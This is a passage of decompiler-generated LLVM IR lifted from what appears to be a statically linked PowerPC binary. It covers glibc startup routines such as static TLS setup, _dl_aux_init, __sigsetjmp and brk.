  %v2_1000f7e8 = inttoptr i32 %v1_1000f7e8 to i32*
  %v3_1000f7e8 = load i32, i32* %v2_1000f7e8, align 4
  store i32 %v3_1000f7e8, i32* %r24.global-to-local, align 4
  %v3_1000f7ec = icmp ugt i32 %v3_1000f7e0, %arg2
  %v1_1000f7f0 = add i32 %v0_1000f7f0, 16
  %v2_1000f7f0 = inttoptr i32 %v1_1000f7f0 to i32*
  %v3_1000f7f0 = load i32, i32* %v2_1000f7f0, align 4
  store i32 %v3_1000f7f0, i32* %r23.global-to-local, align 4
  %v1_1000f7f4 = add i32 %v0_1000f7f0, 8
  %v2_1000f7f4 = inttoptr i32 %v1_1000f7f4 to i32*
  %v3_1000f7f4 = load i32, i32* %v2_1000f7f4, align 4
  store i32 %v3_1000f7f4, i32* %r25.global-to-local, align 4
  br i1 %v3_1000f7ec, label %dec_label_pc_1000f81c, label %dec_label_pc_1000f820

dec_label_pc_1000f800:                            ; preds = %dec_label_pc_1000f7d4
  %v1_1000f800 = add i32 %v0_1000f7f0, 32
  store i32 %v2_1000f80c4, i32* %r0.global-to-local, align 4
  %v2_1000f810 = icmp ult i32 %v1_1000f800, %v2_1000f80c4
  br i1 %v2_1000f810, label %dec_label_pc_1000f7d4, label %dec_label_pc_1000f804.dec_label_pc_1000f958.loopexit_crit_edge

dec_label_pc_1000f81c:                            ; preds = %dec_label_pc_1000f7e0
  br label %dec_label_pc_1000f820

dec_label_pc_1000f820:                            ; preds = %dec_label_pc_1000f7e0, %dec_label_pc_1000f81c
  %v1_1000f87430 = phi i32 [ %arg2, %dec_label_pc_1000f7e0 ], [ %v3_1000f7e0, %dec_label_pc_1000f81c ]
  %v3_1000f820 = icmp eq i32 %v3_1000f7e0, 0
  %v1_1000f824 = add i32 %v3_1000f7e0, -1
  store i32 %v1_1000f824, i32* %r0.global-to-local, align 4
  br i1 %v3_1000f820, label %dec_label_pc_1000f854, label %dec_label_pc_1000f848

dec_label_pc_1000f848:                            ; preds = %dec_label_pc_1000f820
  br label %dec_label_pc_1000f858

dec_label_pc_1000f854:                            ; preds = %dec_label_pc_1000f820, %dec_label_pc_1000f958
  %v1_1000f858.pre = phi i32 [ %arg1, %dec_label_pc_1000f820 ], [ %v1_1000f858.pre.pre, %dec_label_pc_1000f958 ]
  %v1_1000f87429 = phi i32 [ %v1_1000f87430, %dec_label_pc_1000f820 ], [ %v0_1000f958, %dec_label_pc_1000f958 ]
  %v1_1000f87025 = phi i32 [ %v3_1000f7e8, %dec_label_pc_1000f820 ], [ 0, %dec_label_pc_1000f958 ]
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f858

dec_label_pc_1000f858:                            ; preds = %dec_label_pc_1000f848, %dec_label_pc_1000f854
  %v1_1000f858 = phi i32 [ %v1_1000f858.pre, %dec_label_pc_1000f854 ], [ %arg1, %dec_label_pc_1000f848 ]
  %v1_1000f874 = phi i32 [ %v1_1000f87429, %dec_label_pc_1000f854 ], [ %v1_1000f87430, %dec_label_pc_1000f848 ]
  %v1_1000f870 = phi i32 [ %v1_1000f87025, %dec_label_pc_1000f854 ], [ %v3_1000f7e8, %dec_label_pc_1000f848 ]
  %v1_1000f860 = phi i32 [ 1, %dec_label_pc_1000f854 ], [ %v3_1000f7e0, %dec_label_pc_1000f848 ]
  %v0_1000f858 = phi i32 [ 0, %dec_label_pc_1000f854 ], [ %v1_1000f824, %dec_label_pc_1000f848 ]
  %v2_1000f858 = add i32 %v1_1000f858, %v0_1000f858
  %v2_1000f860 = udiv i32 %v2_1000f858, %v1_1000f860
  store i32 %v2_1000f860, i32* %r0.global-to-local, align 4
  %v3_1000f864 = load i32, i32* @global_var_10021258.574, align 4
  store i32 ptrtoint (i32* @global_var_100232e8.579 to i32), i32* %r29.global-to-local, align 4
  %v2_1000f87c = mul i32 %v2_1000f860, %v1_1000f860
  store i32 %v2_1000f87c, i32* %r26.global-to-local, align 4
  %v1_1000f86c = add i32 %v1_1000f874, 1136
  %v2_1000f870 = add i32 %v1_1000f86c, %v1_1000f870
  %v2_1000f874 = add i32 %v2_1000f870, %v2_1000f87c
  %v2_1000f880 = add i32 %v2_1000f874, %v3_1000f864
  store i32 268499080, i32* @lr, align 4
  %v1_1000f884 = call i32 @__GI_sbrk(i32 %v2_1000f880)
  %v0_1000f888 = load i32, i32* @r30, align 4
  %v1_1000f888 = sub i32 0, %v0_1000f888
  %v0_1000f890 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_1000f890, i32* @global_var_10023818.584, align 4
  %v2_1000f88c = add i32 %v1_1000f884, 1135
  %v1_1000f894 = add i32 %v2_1000f88c, %v0_1000f888
  %v0_1000f898 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_1000f898, i32* @r4, align 4
  %v2_1000f89c = and i32 %v1_1000f894, %v1_1000f888
  store i32 %v2_1000f89c, i32* %r28.global-to-local, align 4
  %v2_1000f8a4 = add i32 %v2_1000f89c, %v0_1000f890
  store i32 62, i32* @global_var_100235f0.585, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_1000f8a4, i32* @global_var_10023600.586, align 4
  store i8 1, i8* bitcast (i32* @global_var_10023604.587 to i8*), align 4
  store i32 %v2_1000f8a4, i32* @r3, align 4
  %v0_1000f8bc = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000f8bc, i32* @r5, align 4
  store i32 268499140, i32* @lr, align 4
  %v0_1000f8c0 = call i32 @memcpy()
  %v0_1000f8c4 = load i32, i32* @r31, align 4
  %v3_1000f8c4 = icmp eq i32 %v0_1000f8c4, 0
  store i32 1, i32* %r8.global-to-local, align 4
  store i32 1, i32* @global_var_10021254.575, align 4
  store i32 64, i32* @global_var_100232e8.579, align 4
  %v0_1000f8e8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000f8e8, i32* @global_var_1002125c.580, align 4
  %v0_1000f8ec = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f8ec = add i32 %v0_1000f8ec, 28672
  store i32 %v1_1000f8ec, i32* @r2, align 4
  store i32 ptrtoint (i32* @global_var_100237f0.583 to i32), i32* @global_var_10023304.589, align 4
  %v1_1000f8f4 = add i32 %v0_1000f8c4, -1
  store i32 %v1_1000f8f4, i32* %r0.global-to-local, align 4
  %v2_1000f8f8 = add i32 %v0_1000f8ec, -4
  %v3_1000f8f8 = inttoptr i32 %v2_1000f8f8 to i32*
  store i32 ptrtoint (i32* @global_var_100235f8.588 to i32), i32* %v3_1000f8f8, align 4
  %v0_1000f8fc = load i32, i32* @r31, align 4
  %v0_1000f900 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_1000f900, i32* @global_var_10023804.590, align 4
  %v0_1000f904 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1000f904, i32* @global_var_10023808.591, align 4
  store i32 %v0_1000f8fc, i32* @global_var_10023810.592, align 4
  %v0_1000f90c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_1000f90c, i32* @global_var_1002380c.593, align 4
  %v0_1000f910 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1000f910, i32* @global_var_1002381c.594, align 4
  br i1 %v3_1000f8c4, label %dec_label_pc_1000f918, label %dec_label_pc_1000f858.dec_label_pc_1000f924_crit_edge

dec_label_pc_1000f858.dec_label_pc_1000f924_crit_edge: ; preds = %dec_label_pc_1000f858
  %v0_1000f924.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f924

dec_label_pc_1000f918:                            ; preds = %dec_label_pc_1000f858
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000f924

dec_label_pc_1000f924:                            ; preds = %dec_label_pc_1000f858.dec_label_pc_1000f924_crit_edge, %dec_label_pc_1000f918
  %v0_1000f934 = phi i32 [ %v0_1000f8fc, %dec_label_pc_1000f858.dec_label_pc_1000f924_crit_edge ], [ 1, %dec_label_pc_1000f918 ]
  %v0_1000f924 = phi i32 [ %v0_1000f924.pre, %dec_label_pc_1000f858.dec_label_pc_1000f924_crit_edge ], [ 0, %dec_label_pc_1000f918 ]
  %v2_1000f924 = add i32 %v0_1000f924, %v0_1000f90c
  %v0_1000f928 = load i32, i32* @r30, align 4
  store i32 %v0_1000f928, i32* @r4, align 4
  %v2_1000f92c = urem i32 %v2_1000f924, %v0_1000f934
  %v2_1000f934 = sub i32 %v2_1000f924, %v2_1000f92c
  store i32 %v2_1000f934, i32* %r0.global-to-local, align 4
  %v1_1000f938 = load i32, i32* %r26.global-to-local, align 4
  %v2_1000f938 = add i32 %v1_1000f938, %v2_1000f934
  store i32 %v2_1000f938, i32* @r3, align 4
  %tmp36 = icmp ugt i32 %v0_1000f928, 15
  br i1 %tmp36, label %dec_label_pc_1000f944, label %dec_label_pc_1000f940

dec_label_pc_1000f940:                            ; preds = %dec_label_pc_1000f924
  store i32 16, i32* @r4, align 4
  br label %dec_label_pc_1000f944

dec_label_pc_1000f944:                            ; preds = %dec_label_pc_1000f924, %dec_label_pc_1000f940
  store i32 %v0_1000f7a0, i32* %r0.global-to-local, align 4
  %v0_1000f954 = call i32 @init_static_tls()
  %v0_1000f958.pre = load i32, i32* @r11, align 4
  %v1_1000f858.pre.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000f958

dec_label_pc_1000f804.dec_label_pc_1000f958.loopexit_crit_edge: ; preds = %dec_label_pc_1000f800
  br label %dec_label_pc_1000f958

dec_label_pc_1000f958:                            ; preds = %dec_label_pc_1000f804.preheader, %dec_label_pc_1000f804.dec_label_pc_1000f958.loopexit_crit_edge, %entry, %dec_label_pc_1000f944
  %v1_1000f858.pre.pre = phi i32 [ %arg1, %entry ], [ %v1_1000f858.pre.pre.pre, %dec_label_pc_1000f944 ], [ %arg1, %dec_label_pc_1000f804.dec_label_pc_1000f958.loopexit_crit_edge ], [ %arg1, %dec_label_pc_1000f804.preheader ]
  %v0_1000f958 = phi i32 [ %arg2, %entry ], [ %v0_1000f958.pre, %dec_label_pc_1000f944 ], [ %arg2, %dec_label_pc_1000f804.dec_label_pc_1000f958.loopexit_crit_edge ], [ %arg2, %dec_label_pc_1000f804.preheader ]
  store i32 0, i32* %r24.global-to-local, align 4
  store i32 0, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_1000f854

; uselistorder directives
  uselistorder i32 %v1_1000f800, { 1, 0 }
  uselistorder i32 %v3_1000f7e0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_1000f7f0, { 5, 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_1000f80c4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000f7c0, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 12, 11 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 15, { 0, 20, 21, 22, 30, 23, 24, 25, 26, 27, 28, 29, 31, 4, 5, 6, 8, 9, 7, 10, 11, 12, 13, 1, 14, 15, 2, 16, 17, 18, 19, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_100232e8.579, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_100232e8.579 to i32), { 1, 0 }
  uselistorder i32 %arg1, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_1000f958, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_1000f944, { 1, 0 }
  uselistorder label %dec_label_pc_1000f924, { 1, 0 }
  uselistorder label %dec_label_pc_1000f858, { 1, 0 }
  uselistorder label %dec_label_pc_1000f854, { 1, 0 }
  uselistorder label %dec_label_pc_1000f820, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7d4, { 1, 0 }
}

define i32 @__pthread_initialize_minimal(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000f978 = call i32 @__libc_setup_tls(i32 0, i32 16)
  ret i32 %v2_1000f978
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_1000f97c = add i32 %arg1, 28
  %v2_1000f97c = inttoptr i32 %v1_1000f97c to i32*
  %v3_1000f97c = load i32, i32* %v2_1000f97c, align 4
  %v1_1000f984 = add i32 %arg1, 44
  %v2_1000f984 = inttoptr i32 %v1_1000f984 to i32*
  %v3_1000f984 = load i32, i32* %v2_1000f984, align 4
  store i32 %v3_1000f97c, i32* @global_var_1002126c.581, align 4
  store i32 %v3_1000f984, i32* @global_var_10021270.582, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* @global_var_10021270.582, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1000f998 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v1_1000f9ac = add i32 %arg1, 40
  %v2_1000f9ac = inttoptr i32 %v1_1000f9ac to i32*
  %v3_1000f9ac = load i32, i32* %v2_1000f9ac, align 4
  %v1_1000f9b0 = add i32 %arg1, 44
  %v2_1000f9b0 = inttoptr i32 %v1_1000f9b0 to i32*
  %v3_1000f9b0 = load i32, i32* %v2_1000f9b0, align 4
  %v0_1000f9b4 = load i32, i32* @r2, align 4
  %v1_1000f9b4 = add i32 %v0_1000f9b4, -28676
  %v2_1000f9b4 = inttoptr i32 %v1_1000f9b4 to i32*
  %v3_1000f9b4 = load i32, i32* %v2_1000f9b4, align 4
  store i32 %v3_1000f9b4, i32* %r10.global-to-local, align 4
  %v1_1000f9bc = mul i32 %v3_1000f9b0, 8
  %v2_1000f9b8 = add i32 %v3_1000f9ac, -28672
  %v1_1000f9c4 = add i32 %v2_1000f9b8, %v0_1000f9b4
  %v2_1000f9c8 = add i32 %v3_1000f9b4, %v1_1000f9bc
  %v3_1000f9cc = add i32 %v2_1000f9c8, 4
  %v4_1000f9cc = inttoptr i32 %v3_1000f9cc to i8*
  store i8 1, i8* %v4_1000f9cc, align 1
  %v2_1000f9d0 = load i32, i32* %r10.global-to-local, align 4
  %v3_1000f9d0 = add i32 %v2_1000f9d0, %v1_1000f9bc
  %v4_1000f9d0 = inttoptr i32 %v3_1000f9d0 to i32*
  store i32 %v1_1000f9c4, i32* %v4_1000f9d0, align 4
  %v0_1000f9d4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f9d4 = add i32 %v0_1000f9d4, 20
  %v2_1000f9d4 = inttoptr i32 %v1_1000f9d4 to i32*
  %v3_1000f9d4 = load i32, i32* %v2_1000f9d4, align 4
  store i32 %v3_1000f9d4, i32* @r4, align 4
  %v1_1000f9d8 = add i32 %v0_1000f9d4, 24
  %v2_1000f9d8 = inttoptr i32 %v1_1000f9d8 to i32*
  %v3_1000f9d8 = load i32, i32* %v2_1000f9d8, align 4
  store i32 268499424, i32* @lr, align 4
  %v4_1000f9dc = load i32, i32* %r7.global-to-local, align 4
  %v5_1000f9dc = load i32, i32* @r8, align 4
  %v7_1000f9dc = call i32 @__GI_mempcpy(i32 %v1_1000f9c4, i32 %v3_1000f9d4, i32 %v3_1000f9d8, i32 %v1_1000f9bc, i32 %v4_1000f9dc, i32 %v5_1000f9dc, i32 %v1_1000f9bc)
  %v0_1000f9e0 = load i32, i32* @r29, align 4
  %v1_1000f9e0 = add i32 %v0_1000f9e0, 24
  %v2_1000f9e0 = inttoptr i32 %v1_1000f9e0 to i32*
  %v3_1000f9e0 = load i32, i32* %v2_1000f9e0, align 4
  %v1_1000f9e4 = add i32 %v0_1000f9e0, 28
  %v2_1000f9e4 = inttoptr i32 %v1_1000f9e4 to i32*
  %v3_1000f9e4 = load i32, i32* %v2_1000f9e4, align 4
  %v2_1000f9f0 = sub i32 %v3_1000f9e4, %v3_1000f9e0
  store i32 %v0_1000f998, i32* @lr, align 4
  %v3_1000fa00 = call i32 @__GI_memset(i32 %v7_1000f9dc, i32 0, i32 %v2_1000f9f0)
  ret i32 %v3_1000fa00

; uselistorder directives
  uselistorder i32 %v1_1000f9bc, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 12, 1, 3, 10, 11, 0, 2, 4, 5, 9, 8, 7, 6 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i32* @r8, { 9, 78, 12, 77, 1, 24, 25, 2, 37, 38, 6, 5, 39, 40, 48, 49, 50, 51, 52, 53, 54, 55, 56, 3, 47, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 4, 74, 75, 76, 10, 21, 11, 45, 46, 26, 27, 28, 8, 29, 30, 41, 42, 43, 44, 31, 32, 0, 14, 7, 15, 16, 17, 18, 13, 33, 19, 20, 22, 23, 34, 35, 36 }
  uselistorder i8 1, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__sigsetjmp(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 0, i32* %r16.global-to-local, align 4
  store i32 0, i32* %r15.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_1000fa04 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v3_1000fa04, i32* %arg1, align 4
  %v0_1000fa08 = load i32, i32* @lr, align 4
  store i32 %v0_1000fa08, i32* %r0.global-to-local, align 4
  %v0_1000fa0c = load i32, i32* @r2, align 4
  %v2_1000fa0c = add i32 %tmp, 4
  %v3_1000fa0c = inttoptr i32 %v2_1000fa0c to i32*
  store i32 %v0_1000fa0c, i32* %v3_1000fa0c, align 4
  %v0_1000fa10 = load i32, i32* @r14, align 4
  %v2_1000fa10 = add i32 %tmp, 12
  %v3_1000fa10 = inttoptr i32 %v2_1000fa10 to i32*
  store i32 %v0_1000fa10, i32* %v3_1000fa10, align 4
  %v0_1000fa18 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000fa18 = add i32 %tmp, 8
  %v3_1000fa18 = inttoptr i32 %v2_1000fa18 to i32*
  store i32 %v0_1000fa18, i32* %v3_1000fa18, align 4
  %v0_1000fa1c = load i32, i32* %r15.global-to-local, align 4
  %v2_1000fa1c = add i32 %tmp, 16
  %v3_1000fa1c = inttoptr i32 %v2_1000fa1c to i32*
  store i32 %v0_1000fa1c, i32* %v3_1000fa1c, align 4
  %v0_1000fa24 = call i32 @__asm_mfcr()
  store i32 %v0_1000fa24, i32* @r3, align 4
  store i32 %v0_1000fa24, i32* %r0.global-to-local, align 4
  %v0_1000fa28 = load i32, i32* %r16.global-to-local, align 4
  %v2_1000fa28 = add i32 %v0_1000fa24, 20
  %v3_1000fa28 = inttoptr i32 %v2_1000fa28 to i32*
  store i32 %v0_1000fa28, i32* %v3_1000fa28, align 4
  %v2_1000fa30 = add i32 %v0_1000fa24, 84
  %v3_1000fa30 = inttoptr i32 %v2_1000fa30 to i32*
  store i32 %v0_1000fa24, i32* %v3_1000fa30, align 4
  %v0_1000fa34 = load i32, i32* @r17, align 4
  %v2_1000fa34 = add i32 %v0_1000fa24, 24
  %v3_1000fa34 = inttoptr i32 %v2_1000fa34 to i32*
  store i32 %v0_1000fa34, i32* %v3_1000fa34, align 4
  %v0_1000fa3c = load i32, i32* %r18.global-to-local, align 4
  %v2_1000fa3c = add i32 %v0_1000fa24, 28
  %v3_1000fa3c = inttoptr i32 %v2_1000fa3c to i32*
  store i32 %v0_1000fa3c, i32* %v3_1000fa3c, align 4
  %v0_1000fa44 = load i32, i32* @r19, align 4
  %v2_1000fa44 = add i32 %v0_1000fa24, 32
  %v3_1000fa44 = inttoptr i32 %v2_1000fa44 to i32*
  store i32 %v0_1000fa44, i32* %v3_1000fa44, align 4
  %v0_1000fa4c = load i32, i32* @r20, align 4
  %v2_1000fa4c = add i32 %v0_1000fa24, 36
  %v3_1000fa4c = inttoptr i32 %v2_1000fa4c to i32*
  store i32 %v0_1000fa4c, i32* %v3_1000fa4c, align 4
  %v0_1000fa54 = load i32, i32* @r21, align 4
  %v2_1000fa54 = add i32 %v0_1000fa24, 40
  %v3_1000fa54 = inttoptr i32 %v2_1000fa54 to i32*
  store i32 %v0_1000fa54, i32* %v3_1000fa54, align 4
  %v0_1000fa5c = load i32, i32* @r22, align 4
  %v2_1000fa5c = add i32 %v0_1000fa24, 44
  %v3_1000fa5c = inttoptr i32 %v2_1000fa5c to i32*
  store i32 %v0_1000fa5c, i32* %v3_1000fa5c, align 4
  %v0_1000fa64 = load i32, i32* @r23, align 4
  %v2_1000fa64 = add i32 %v0_1000fa24, 48
  %v3_1000fa64 = inttoptr i32 %v2_1000fa64 to i32*
  store i32 %v0_1000fa64, i32* %v3_1000fa64, align 4
  %v0_1000fa6c = load i32, i32* @r24, align 4
  %v2_1000fa6c = add i32 %v0_1000fa24, 52
  %v3_1000fa6c = inttoptr i32 %v2_1000fa6c to i32*
  store i32 %v0_1000fa6c, i32* %v3_1000fa6c, align 4
  %v0_1000fa74 = load i32, i32* @r25, align 4
  %v2_1000fa74 = add i32 %v0_1000fa24, 56
  %v3_1000fa74 = inttoptr i32 %v2_1000fa74 to i32*
  store i32 %v0_1000fa74, i32* %v3_1000fa74, align 4
  %v0_1000fa7c = load i32, i32* @r26, align 4
  %v2_1000fa7c = add i32 %v0_1000fa24, 60
  %v3_1000fa7c = inttoptr i32 %v2_1000fa7c to i32*
  store i32 %v0_1000fa7c, i32* %v3_1000fa7c, align 4
  %v0_1000fa84 = load i32, i32* @r27, align 4
  %v2_1000fa84 = add i32 %v0_1000fa24, 64
  %v3_1000fa84 = inttoptr i32 %v2_1000fa84 to i32*
  store i32 %v0_1000fa84, i32* %v3_1000fa84, align 4
  %v0_1000fa8c = load i32, i32* @r28, align 4
  %v2_1000fa8c = add i32 %v0_1000fa24, 68
  %v3_1000fa8c = inttoptr i32 %v2_1000fa8c to i32*
  store i32 %v0_1000fa8c, i32* %v3_1000fa8c, align 4
  %v0_1000fa94 = load i32, i32* @r29, align 4
  %v2_1000fa94 = add i32 %v0_1000fa24, 72
  %v3_1000fa94 = inttoptr i32 %v2_1000fa94 to i32*
  store i32 %v0_1000fa94, i32* %v3_1000fa94, align 4
  %v0_1000fa9c = load i32, i32* @r30, align 4
  %v2_1000fa9c = add i32 %v0_1000fa24, 76
  %v3_1000fa9c = inttoptr i32 %v2_1000fa9c to i32*
  store i32 %v0_1000fa9c, i32* %v3_1000fa9c, align 4
  %v0_1000faa4 = load i32, i32* @r31, align 4
  %v2_1000faa4 = add i32 %v0_1000fa24, 80
  %v3_1000faa4 = inttoptr i32 %v2_1000faa4 to i32*
  store i32 %v0_1000faa4, i32* %v3_1000faa4, align 4
  %v0_1000faac = call i32 @__sigjmp_save()
  ret i32 %v0_1000faac

; uselistorder directives
  uselistorder i32 %v0_1000fa24, { 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 2, 3, 4, 16, 5, 17, 19, 18 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32 80, { 6, 5, 1, 2, 3, 4, 0 }
  uselistorder i32 76, { 4, 2, 3, 0, 1 }
  uselistorder i32 72, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 68, { 5, 0, 6, 3, 4, 1, 2 }
  uselistorder i32 60, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 4, 1, 2, 3, 0, 5 }
  uselistorder i32* @r26, { 81, 83, 102, 103, 104, 27, 28, 84, 85, 86, 1, 87, 88, 89, 90, 91, 92, 93, 94, 2, 95, 99, 3, 96, 97, 98, 100, 101, 66, 55, 56, 82, 72, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67, 68, 69, 70, 71, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i32 56, { 19, 21, 22, 23, 25, 24, 1, 26, 27, 28, 8, 9, 2, 3, 0, 20, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* @r25, { 83, 84, 93, 94, 85, 86, 87, 88, 89, 90, 91, 92, 68, 57, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16, 21, 22, 23, 17, 18, 19, 20, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 1, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82 }
  uselistorder i32 52, { 15, 17, 18, 19, 20, 21, 22, 8, 9, 6, 7, 23, 0, 24, 1, 2, 16, 10, 11, 3, 12, 4, 13, 5, 14 }
  uselistorder i32* @r24, { 73, 74, 75, 91, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 90, 89, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 22, 23, 17, 18, 19, 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 0, 66, 67, 68, 69, 70, 71, 72 }
  uselistorder i32 48, { 19, 20, 1, 21, 13, 9, 10, 2, 15, 0, 3, 4, 5, 11, 12, 14, 6, 16, 7, 17, 8, 18 }
  uselistorder i32* @r23, { 55, 56, 62, 57, 58, 59, 60, 61, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 44, { 12, 3, 13, 14, 4, 18, 19, 20, 21, 15, 16, 17, 22, 23, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11 }
  uselistorder i32* @r22, { 76, 81, 82, 77, 78, 79, 80, 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 16, 17, 18, 11, 12, 13, 14, 15, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75 }
  uselistorder i32 40, { 22, 7, 23, 3, 0, 8, 9, 2, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 4, 19, 5, 20, 6, 21 }
  uselistorder i32* @r21, { 49, 50, 51, 52, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 36, { 15, 8, 9, 6, 7, 0, 2, 1, 3, 4, 10, 5, 11, 12, 13, 14 }
  uselistorder i32* @r20, { 3, 0, 1, 2 }
  uselistorder i32 32, { 62, 63, 0, 61, 64, 65, 66, 67, 68, 69, 44, 45, 38, 39, 60, 33, 71, 72, 70, 2, 1, 4, 3, 73, 40, 5, 6, 7, 53, 32, 54, 34, 35, 36, 8, 9, 41, 10, 11, 12, 13, 14, 37, 15, 16, 17, 18, 19, 20, 21, 22, 42, 43, 46, 47, 31, 48, 49, 50, 51, 52, 55, 56, 57, 58, 59, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* @r19, { 1, 0 }
  uselistorder i32* @r17, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 84, { 3, 2, 0, 1 }
  uselistorder i32* @r14, { 2, 0, 1 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_10021274.557, align 4
  store i1 true, i1* @cr0_eq, align 1
  %v0_1000fad8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000fad8)
  store i32 12, i32* @r3, align 4
  %v0_1000fae0 = call i32 @__syscall_error()
  ret i32 %v0_1000fae0

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 4, 6, 5, 8, 7, 1, 0, 3, 2 }
  uselistorder i1 true, { 14, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* @global_var_10021274.557, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000faec = call i32 @__asm_mfcr()
  %v1_1000faf0 = and i32 %v0_1000faec, 268435456
  %v3_1000faf0 = icmp eq i32 %v1_1000faf0, 0
